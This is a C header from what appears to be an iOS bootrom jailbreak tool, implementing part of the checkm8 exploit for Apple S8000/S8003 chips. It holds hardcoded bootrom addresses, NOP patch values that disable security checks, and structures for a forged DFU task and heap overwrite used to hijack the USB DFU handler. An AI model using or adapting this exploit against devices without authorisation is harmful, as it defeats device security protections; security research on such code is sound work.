#ifndef CHECKM8_S8000_H
#define CHECKM8_S8000_H
#include <iousb.h>

// 0x7ff's eclipsa
// original: https://github.com/0x7ff/eclipsa
#define TASK_NAME_MAX (15)

#define DFU_ARCH_SZ (0x310)

#define EP0_MAX_PACKET_SZ (0x40)
#define DFU_HEAP_BLOCK_SZ (0x40)

#define TASK_STACK_MIN (0x4000)
#define TASK_MAGIC_1 (0x74736B32)
#define TASK_STACK_MAGIC (0x7374616B)

#define PATCH_VAL_0 (0xD503201F) /* nop */
#define PATCH_VAL_1 (0xD503201F) /* nop */
#define PATCH_VAL_2 (0xD503201F) /* nop */
#define PATCH_VAL_3 (0xD503201F) /* nop */

// s8000 && s8003
#define SYNOPSYS_ROUTINE_ADDR (0x100006718)
#define IO_BUFFER_ADDR (0x18010D500)
#define VROM_PAGE_TABLE_ADDR (0x1800C8400)
#define ARCH_TASK_TRAMP_ADDR (0x10000D998)

#define PATCH_ADDR_0 (0x100007924)
#define PATCH_ADDR_1 (0x10000792C)
#define PATCH_ADDR_2 (0x100007958)
#define PATCH_ADDR_3 (0x100007C9C)

typedef struct {
    UInt64 prev, next;
} dfu_list_node_t;

typedef struct {
    UInt64 x[29], fp, lr, sp;
    UInt32 shc[(DFU_ARCH_SZ - 32 * sizeof(UInt64)) / sizeof(UInt32)];
} dfu_arch_t;

typedef struct {
    dfu_list_node_t list;
    UInt64 sched_ticks, delay, cb, arg;
} dfu_callout_t;

typedef struct {
    UInt32 magic_0, pad_0;
    dfu_list_node_t task_list, queue_list;
    enum {
        TASK_INITIAL,
        TASK_READY,
        TASK_RUNNING,
        TASK_BLOCKED,
        TASK_SLEEPING,
        TASK_FINISHED
    } state;
    UInt32 irq_dis_cnt;
    dfu_arch_t arch;
    dfu_callout_t callout;
    dfu_list_node_t ret_waiters_list;
    UInt32 ret, pad_1;
    UInt64 routine, arg, stack_base, stack_len;
    char name[TASK_NAME_MAX + 1];
    UInt32 id, magic_1;
} dfu_task_t;

typedef struct {
    UInt64 this_free : 1, prev_free : 1, prev_sz : 62, this_sz;
    UInt8 pad[DFU_HEAP_BLOCK_SZ - 2 * sizeof(UInt64)];
} dfu_heap_block_t;

typedef struct {
    dfu_task_t synopsys_task;
    dfu_heap_block_t heap_block;
    dfu_task_t fake_task;
    UInt8 extra[EP0_MAX_PACKET_SZ];
} dfu_overwrite_t;

int checkm8_s8000(io_client_t client);

#endif
